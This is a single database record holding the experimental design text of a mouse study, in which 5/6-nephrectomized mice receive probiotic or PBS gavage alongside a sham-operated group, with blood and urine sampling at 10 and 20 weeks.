	(9072,243,'experimental_design','\"Eight-week-old male C57BL\\/6 mice were undergone 5\\/6 nephrectomy.\\nThen, the 5\\/6 nephrectomized mice were randomly divided into 2 groups with allocation concealment, the probiotics gavage (5\\/6Nx L34) group and the phosphate buffer solution (PBS) administration control (5\\/6Nx PBS) group. Another group of mice were were sham operated to identify renal vessel before abdominal closure (Sham group). At 10 weeks after 5\\/6Nx in the first two groups or after sham in the sham group, 50 \\u00b5L of blood was collected through tail vein nicking and urine was collected in metabolic cages (Hatteras Instruments, NC, USA). At 20 weeks post-5\\/6Nx, blood sample were collected with cardiac puncture from all mice under isoflurane anesthesia. The animals were sacrifice thereafter.\"','2022-03-31 13:23:59','2022-03-31 13:23:59'),
